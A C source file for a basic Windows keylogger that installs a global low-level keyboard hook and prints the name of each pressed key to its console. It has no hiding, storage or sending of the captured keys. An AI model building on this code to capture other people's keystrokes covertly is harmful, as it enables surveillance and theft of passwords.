#include <windows.h>
#include <stdio.h>

LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    // Log keyboard events
    KBDLLHOOKSTRUCT *pkey = (KBDLLHOOKSTRUCT *) lParam;
    if(wParam == WM_KEYDOWN)
    {
        switch(pkey->vkCode)
        {
            /*
            case 0x01:
                printf("[0x01] - [VK_LBUTTON] - [Left mouse button]\n");
                break;
            case 0x02:
                printf("[0x02] - [VK_RBUTTON] - [Right mouse button]\n");
                break;
            case 0x03:
                printf("[0x03] - [VK_CANCEL] - [Control-break processing]\n");
                break;
            case 0x04:
                printf("[0x04] - [VK_MBUTTON] - [Middle mouse button (three-button mouse)]\n");
                break;
            case 0x05:
                printf("[0x05] - [VK_XBUTTON1] - [X1 mouse button]\n");
                break;
            case 0x06:
                printf("[0x06] - [VK_XBUTTON2] - [X2 mouse button]\n");
                break;
            */

            case 0x07:
                printf("[0x07] - [-] - [Undefined]\n");
                break;
            case 0x08:
                printf("[0x08] - [VK_BACK] - [BACKSPACE key]\n");
                break;
            case 0x09:
                printf("[0x09] - [VK_TAB] - [TAB key]\n");
                break;

            /*
            case 0x0A-0B:
                printf("[0x0A-0B] - [-] - [Reserved]\n");
                break;
            */

            case 0x0C:
                printf("[0x0C] - [VK_CLEAR] - [CLEAR key]\n");
                break;
            case 0x0D:
                printf("[0x0D] - [VK_RETURN] - [ENTER key]\n");
                break;

            /*
            case 0x0E-0F:
                printf("[0x0E-0F] - [-] - [Undefined]\n");
                break;
            */

            case 0x10:
                printf("[0x10] - [VK_SHIFT] - [SHIFT key]\n");
                break;
            case 0x11:
                printf("[0x11] - [VK_CONTROL] - [CTRL key]\n");
                break;
            case 0x12:
                printf("[0x12] - [VK_MENU] - [ALT key]\n");
                break;
            case 0x13:
                printf("[0x13] - [VK_PAUSE] - [PAUSE key]\n");
                break;
            case 0x14:
                printf("[0x14] - [VK_CAPITAL] - [CAPS LOCK key]\n");
                break;

            /*
            case 0x15:
                printf("[0x15] - [VK_KANA] - [IME Kana mode]\n");
                break;
            case 0x15:
                printf("[0x15] - [VK_HANGUEL] - [IME Hanguel mode (maintained for compatibility; use VK_HANGUL)]\n");
                break;
            case 0x15:
                printf("[0x15] - [VK_HANGUL] - [IME Hangul mode]\n");
                break;
            */

            case 0x16:
                printf("[0x16] - [VK_IME_ON] - [IME On]\n");
                break;
            case 0x17:
                printf("[0x17] - [VK_JUNJA] - [IME Junja mode]\n");
                break;
            case 0x18:
                printf("[0x18] - [VK_FINAL] - [IME final mode]\n");
                break;

            /*
            case 0x19:
                printf("[0x19] - [VK_HANJA] - [IME Hanja mode]\n");
                break;
            case 0x19:
                printf("[0x19] - [VK_KANJI] - [IME Kanji mode]\n");
                break;
            */

            case 0x1A:
                printf("[0x1A] - [VK_IME_OFF] - [IME Off]\n");
                break;
            case 0x1B:
                printf("[0x1B] - [VK_ESCAPE] - [ESC key]\n");
                break;
            case 0x1C:
                printf("[0x1C] - [VK_CONVERT] - [IME convert]\n");
                break;
            case 0x1D:
                printf("[0x1D] - [VK_NONCONVERT] - [IME nonconvert]\n");
                break;
            case 0x1E:
                printf("[0x1E] - [VK_ACCEPT] - [IME accept]\n");
                break;
            case 0x1F:
                printf("[0x1F] - [VK_MODECHANGE] - [IME mode change request]\n");
                break;
            case 0x20:
                printf("[0x20] - [VK_SPACE] - [SPACEBAR]\n");
                break;
            case 0x21:
                printf("[0x21] - [VK_PRIOR] - [PAGE UP key]\n");
                break;
            case 0x22:
                printf("[0x22] - [VK_NEXT] - [PAGE DOWN key]\n");
                break;
            case 0x23:
                printf("[0x23] - [VK_END] - [END key]\n");
                break;
            case 0x24:
                printf("[0x24] - [VK_HOME] - [HOME key]\n");
                break;
            case 0x25:
                printf("[0x25] - [VK_LEFT] - [LEFT ARROW key]\n");
                break;
            case 0x26:
                printf("[0x26] - [VK_UP] - [UP ARROW key]\n");
                break;
            case 0x27:
                printf("[0x27] - [VK_RIGHT] - [RIGHT ARROW key]\n");
                break;
            case 0x28:
                printf("[0x28] - [VK_DOWN] - [DOWN ARROW key]\n");
                break;
            case 0x29:
                printf("[0x29] - [VK_SELECT] - [SELECT key]\n");
                break;
            case 0x2A:
                printf("[0x2A] - [VK_PRINT] - [PRINT key]\n");
                break;
            case 0x2B:
                printf("[0x2B] - [VK_EXECUTE] - [EXECUTE key]\n");
                break;
            case 0x2C:
                printf("[0x2C] - [VK_SNAPSHOT] - [PRINT SCREEN key]\n");
                break;
            case 0x2D:
                printf("[0x2D] - [VK_INSERT] - [INS key]\n");
                break;
            case 0x2E:
                printf("[0x2E] - [VK_DELETE] - [DEL key]\n");
                break;
            case 0x2F:
                printf("[0x2F] - [VK_HELP] - [HELP key]\n");
                break;
            case 0x30:
                printf("[0x30] - [] - [0 key]\n");
                break;
            case 0x31:
                printf("[0x31] - [] - [1 key]\n");
                break;
            case 0x32:
                printf("[0x32] - [] - [2 key]\n");
                break;
            case 0x33:
                printf("[0x33] - [] - [3 key]\n");
                break;
            case 0x34:
                printf("[0x34] - [] - [4 key]\n");
                break;
            case 0x35:
                printf("[0x35] - [] - [5 key]\n");
                break;
            case 0x36:
                printf("[0x36] - [] - [6 key]\n");
                break;
            case 0x37:
                printf("[0x37] - [] - [7 key]\n");
                break;
            case 0x38:
                printf("[0x38] - [] - [8 key]\n");
                break;
            case 0x39:
                printf("[0x39] - [] - [9 key]\n");
                break;

            /*
            case 0x3A-40:
                printf("[0x3A-40] - [-] - [Undefined]\n");
                break;
            */

            case 0x41:
                printf("[0x41] - [] - [A key]\n");
                break;
            case 0x42:
                printf("[0x42] - [] - [B key]\n");
                break;
            case 0x43:
                printf("[0x43] - [] - [C key]\n");
                break;
            case 0x44:
                printf("[0x44] - [] - [D key]\n");
                break;
            case 0x45:
                printf("[0x45] - [] - [E key]\n");
                break;
            case 0x46:
                printf("[0x46] - [] - [F key]\n");
                break;
            case 0x47:
                printf("[0x47] - [] - [G key]\n");
                break;
            case 0x48:
                printf("[0x48] - [] - [H key]\n");
                break;
            case 0x49:
                printf("[0x49] - [] - [I key]\n");
                break;
            case 0x4A:
                printf("[0x4A] - [] - [J key]\n");
                break;
            case 0x4B:
                printf("[0x4B] - [] - [K key]\n");
                break;
            case 0x4C:
                printf("[0x4C] - [] - [L key]\n");
                break;
            case 0x4D:
                printf("[0x4D] - [] - [M key]\n");
                break;
            case 0x4E:
                printf("[0x4E] - [] - [N key]\n");
                break;
            case 0x4F:
                printf("[0x4F] - [] - [O key]\n");
                break;
            case 0x50:
                printf("[0x50] - [] - [P key]\n");
                break;
            case 0x51:
                printf("[0x51] - [] - [Q key]\n");
                break;
            case 0x52:
                printf("[0x52] - [] - [R key]\n");
                break;
            case 0x53:
                printf("[0x53] - [] - [S key]\n");
                break;
            case 0x54:
                printf("[0x54] - [] - [T key]\n");
                break;
            case 0x55:
                printf("[0x55] - [] - [U key]\n");
                break;
            case 0x56:
                printf("[0x56] - [] - [V key]\n");
                break;
            case 0x57:
                printf("[0x57] - [] - [W key]\n");
                break;
            case 0x58:
                printf("[0x58] - [] - [X key]\n");
                break;
            case 0x59:
                printf("[0x59] - [] - [Y key]\n");
                break;
            case 0x5A:
                printf("[0x5A] - [] - [Z key]\n");
                break;
            case 0x5B:
                printf("[0x5B] - [VK_LWIN] - [Left Windows key (Natural keyboard)]\n");
                break;
            case 0x5C:
                printf("[0x5C] - [VK_RWIN] - [Right Windows key (Natural keyboard)]\n");
                break;
            case 0x5D:
                printf("[0x5D] - [VK_APPS] - [Applications key (Natural keyboard)]\n");
                break;
            case 0x5E:
                printf("[0x5E] - [-] - [Reserved]\n");
                break;
            case 0x5F:
                printf("[0x5F] - [VK_SLEEP] - [Computer Sleep key]\n");
                break;
            case 0x60:
                printf("[0x60] - [VK_NUMPAD0] - [Numeric keypad 0 key]\n");
                break;
            case 0x61:
                printf("[0x61] - [VK_NUMPAD1] - [Numeric keypad 1 key]\n");
                break;
            case 0x62:
                printf("[0x62] - [VK_NUMPAD2] - [Numeric keypad 2 key]\n");
                break;
            case 0x63:
                printf("[0x63] - [VK_NUMPAD3] - [Numeric keypad 3 key]\n");
                break;
            case 0x64:
                printf("[0x64] - [VK_NUMPAD4] - [Numeric keypad 4 key]\n");
                break;
            case 0x65:
                printf("[0x65] - [VK_NUMPAD5] - [Numeric keypad 5 key]\n");
                break;
            case 0x66:
                printf("[0x66] - [VK_NUMPAD6] - [Numeric keypad 6 key]\n");
                break;
            case 0x67:
                printf("[0x67] - [VK_NUMPAD7] - [Numeric keypad 7 key]\n");
                break;
            case 0x68:
                printf("[0x68] - [VK_NUMPAD8] - [Numeric keypad 8 key]\n");
                break;
            case 0x69:
                printf("[0x69] - [VK_NUMPAD9] - [Numeric keypad 9 key]\n");
                break;
            case 0x6A:
                printf("[0x6A] - [VK_MULTIPLY] - [Multiply key]\n");
                break;
            case 0x6B:
                printf("[0x6B] - [VK_ADD] - [Add key]\n");
                break;
            case 0x6C:
                printf("[0x6C] - [VK_SEPARATOR] - [Separator key]\n");
                break;
            case 0x6D:
                printf("[0x6D] - [VK_SUBTRACT] - [Subtract key]\n");
                break;
            case 0x6E:
                printf("[0x6E] - [VK_DECIMAL] - [Decimal key]\n");
                break;
            case 0x6F:
                printf("[0x6F] - [VK_DIVIDE] - [Divide key]\n");
                break;
            case 0x70:
                printf("[0x70] - [VK_F1] - [F1 key]\n");
                break;
            case 0x71:
                printf("[0x71] - [VK_F2] - [F2 key]\n");
                break;
            case 0x72:
                printf("[0x72] - [VK_F3] - [F3 key]\n");
                break;
            case 0x73:
                printf("[0x73] - [VK_F4] - [F4 key]\n");
                break;
            case 0x74:
                printf("[0x74] - [VK_F5] - [F5 key]\n");
                break;
            case 0x75:
                printf("[0x75] - [VK_F6] - [F6 key]\n");
                break;
            case 0x76:
                printf("[0x76] - [VK_F7] - [F7 key]\n");
                break;
            case 0x77:
                printf("[0x77] - [VK_F8] - [F8 key]\n");
                break;
            case 0x78:
                printf("[0x78] - [VK_F9] - [F9 key]\n");
                break;
            case 0x79:
                printf("[0x79] - [VK_F10] - [F10 key]\n");
                break;
            case 0x7A:
                printf("[0x7A] - [VK_F11] - [F11 key]\n");
                break;
            case 0x7B:
                printf("[0x7B] - [VK_F12] - [F12 key]\n");
                break;
            case 0x7C:
                printf("[0x7C] - [VK_F13] - [F13 key]\n");
                break;
            case 0x7D:
                printf("[0x7D] - [VK_F14] - [F14 key]\n");
                break;
            case 0x7E:
                printf("[0x7E] - [VK_F15] - [F15 key]\n");
                break;
            case 0x7F:
                printf("[0x7F] - [VK_F16] - [F16 key]\n");
                break;
            case 0x80:
                printf("[0x80] - [VK_F17] - [F17 key]\n");
                break;
            case 0x81:
                printf("[0x81] - [VK_F18] - [F18 key]\n");
                break;
            case 0x82:
                printf("[0x82] - [VK_F19] - [F19 key]\n");
                break;
            case 0x83:
                printf("[0x83] - [VK_F20] - [F20 key]\n");
                break;
            case 0x84:
                printf("[0x84] - [VK_F21] - [F21 key]\n");
                break;
            case 0x85:
                printf("[0x85] - [VK_F22] - [F22 key]\n");
                break;
            case 0x86:
                printf("[0x86] - [VK_F23] - [F23 key]\n");
                break;
            case 0x87:
                printf("[0x87] - [VK_F24] - [F24 key]\n");
                break;

            /*
            case 0x88-8F:
                printf("[0x88-8F] - [-] - [Unassigned]\n");
                break;
            */

            case 0x90:
                printf("[0x90] - [VK_NUMLOCK] - [NUM LOCK key]\n");
                break;
            case 0x91:
                printf("[0x91] - [VK_SCROLL] - [SCROLL LOCK key]\n");
                break;

            /*
            case 0x92-96:
                printf("[0x92-96] - [] - [OEM specific]\n");
                break;
            case 0x97-9F:
                printf("[0x97-9F] - [-] - [Unassigned]\n");
                break;
            */

            case 0xA0:
                printf("[0xA0] - [VK_LSHIFT] - [Left SHIFT key] [Down]\n");
                break;
            case 0xA1:
                printf("[0xA1] - [VK_RSHIFT] - [Right SHIFT key] [Down]\n");
                break;
            case 0xA2:
                printf("[0xA2] - [VK_LCONTROL] - [Left CONTROL key]\n");
                break;
            case 0xA3:
                printf("[0xA3] - [VK_RCONTROL] - [Right CONTROL key]\n");
                break;
            case 0xA4:
                printf("[0xA4] - [VK_LMENU] - [Left ALT key]\n");
                break;
            case 0xA5:
                printf("[0xA5] - [VK_RMENU] - [Right ALT key]\n");
                break;
            case 0xA6:
                printf("[0xA6] - [VK_BROWSER_BACK] - [Browser Back key]\n");
                break;
            case 0xA7:
                printf("[0xA7] - [VK_BROWSER_FORWARD] - [Browser Forward key]\n");
                break;
            case 0xA8:
                printf("[0xA8] - [VK_BROWSER_REFRESH] - [Browser Refresh key]\n");
                break;
            case 0xA9:
                printf("[0xA9] - [VK_BROWSER_STOP] - [Browser Stop key]\n");
                break;
            case 0xAA:
                printf("[0xAA] - [VK_BROWSER_SEARCH] - [Browser Search key]\n");
                break;
            case 0xAB:
                printf("[0xAB] - [VK_BROWSER_FAVORITES] - [Browser Favorites key]\n");
                break;
            case 0xAC:
                printf("[0xAC] - [VK_BROWSER_HOME] - [Browser Start and Home key]\n");
                break;
            case 0xAD:
                printf("[0xAD] - [VK_VOLUME_MUTE] - [Volume Mute key]\n");
                break;
            case 0xAE:
                printf("[0xAE] - [VK_VOLUME_DOWN] - [Volume Down key]\n");
                break;
            case 0xAF:
                printf("[0xAF] - [VK_VOLUME_UP] - [Volume Up key]\n");
                break;
            case 0xB0:
                printf("[0xB0] - [VK_MEDIA_NEXT_TRACK] - [Next Track key]\n");
                break;
            case 0xB1:
                printf("[0xB1] - [VK_MEDIA_PREV_TRACK] - [Previous Track key]\n");
                break;
            case 0xB2:
                printf("[0xB2] - [VK_MEDIA_STOP] - [Stop Media key]\n");
                break;
            case 0xB3:
                printf("[0xB3] - [VK_MEDIA_PLAY_PAUSE] - [Play/Pause Media key]\n");
                break;
            case 0xB4:
                printf("[0xB4] - [VK_LAUNCH_MAIL] - [Start Mail key]\n");
                break;
            case 0xB5:
                printf("[0xB5] - [VK_LAUNCH_MEDIA_SELECT] - [Select Media key]\n");
                break;
            case 0xB6:
                printf("[0xB6] - [VK_LAUNCH_APP1] - [Start Application 1 key]\n");
                break;
            case 0xB7:
                printf("[0xB7] - [VK_LAUNCH_APP2] - [Start Application 2 key]\n");
                break;

            /*
            case 0xB8-B9:
                printf("[0xB8-B9] - [-] - [Reserved]\n");
                break;
            */

            case 0xBA:
                printf("[0xBA] - [VK_OEM_1] - [Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the \';:\' key]\n");
                break;
            case 0xBB:
                printf("[0xBB] - [VK_OEM_PLUS] - [For any country/region, the \'+\' key]\n");
                break;
            case 0xBC:
                printf("[0xBC] - [VK_OEM_COMMA] - [For any country/region, the \',\' key]\n");
                break;
            case 0xBD:
                printf("[0xBD] - [VK_OEM_MINUS] - [For any country/region, the \'-\' key]\n");
                break;
            case 0xBE:
                printf("[0xBE] - [VK_OEM_PERIOD] - [For any country/region, the \'.\' key]\n");
                break;
            case 0xBF:
                printf("[0xBF] - [VK_OEM_2] - [Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the \'/?\' key]\n");
                break;
            case 0xC0:
                printf("[0xC0] - [VK_OEM_3] - [Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the \'`~\' key]\n");
                break;

            /*
            case 0xC1-D7:
                printf("[0xC1-D7] - [-] - [Reserved]\n");
                break;
            case 0xD8-DA:
                printf("[0xD8-DA] - [-] - [Unassigned]\n");
                break;
            */

            case 0xDB:
                printf("[0xDB] - [VK_OEM_4] - [Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the \'[{\' key]\n");
                break;
            case 0xDC:
                printf("[0xDC] - [VK_OEM_5] - [Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the \'\\|\' key]\n");
                break;
            case 0xDD:
                printf("[0xDD] - [VK_OEM_6] - [Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the \']}\' key]\n");
                break;
            case 0xDE:
                printf("[0xDE] - [VK_OEM_7] - [Used for miscellaneous characters; it can vary by keyboard. For the US standard keyboard, the \'single-quote/double-quote\' key]\n");
                break;
            case 0xDF:
                printf("[0xDF] - [VK_OEM_8] - [Used for miscellaneous characters; it can vary by keyboard.]\n");
                break;
            case 0xE0:
                printf("[0xE0] - [-] - [Reserved]\n");
                break;
            case 0xE1:
                printf("[0xE1] - [] - [OEM specific]\n");
                break;
            case 0xE2:
                printf("[0xE2] - [VK_OEM_102] - [The <> keys on the US standard keyboard, or the \\| key on the non-US 102-key keyboard]\n");
                break;

            /*
            case 0xE3-E4:
                printf("[0xE3-E4] - [] - [OEM specific]\n");
                break;
            */

            case 0xE5:
                printf("[0xE5] - [VK_PROCESSKEY] - [IME PROCESS key]\n");
                break;
            case 0xE6:
                printf("[0xE6] - [] - [OEM specific]\n");
                break;
            case 0xE7:
                printf("[0xE7] - [VK_PACKET] - [Used to pass Unicode characters as if they were keystrokes. The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods. For more information, see Remark in KEYBDINPUT, SendInput, WM_KEYDOWN, and WM_KEYUP]\n");
                break;
            case 0xE8:
                printf("[0xE8] - [-] - [Unassigned]\n");
                break;

            /*
            case 0xE9-F5:
                printf("[0xE9-F5] - [] - [OEM specific]\n");
                break;
            */

            case 0xF6:
                printf("[0xF6] - [VK_ATTN] - [Attn key]\n");
                break;
            case 0xF7:
                printf("[0xF7] - [VK_CRSEL] - [CrSel key]\n");
                break;
            case 0xF8:
                printf("[0xF8] - [VK_EXSEL] - [ExSel key]\n");
                break;
            case 0xF9:
                printf("[0xF9] - [VK_EREOF] - [Erase EOF key]\n");
                break;
            case 0xFA:
                printf("[0xFA] - [VK_PLAY] - [Play key]\n");
                break;
            case 0xFB:
                printf("[0xFB] - [VK_ZOOM] - [Zoom key]\n");
                break;
            case 0xFC:
                printf("[0xFC] - [VK_NONAME] - [Reserved]\n");
                break;
            case 0xFD:
                printf("[0xFD] - [VK_PA1] - [PA1 key]\n");
                break;
            case 0xFE:
                printf("[0xFE] - [VK_OEM_CLEAR] - [Clear key]\n");
                break;
            default:
                printf("[UNKNOWN]\n");
                break;
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main()
{
    printf("Hello Windows Keylogger\n");
    HHOOK hhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (hhook == NULL)
        printf("Hook wasn't installed\n");
    printf("Hook was installed\n");

    // Start message loop 
    MSG msg;
    while( (GetMessage( &msg, NULL, 0, 0)) != 0)
        {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
        }
}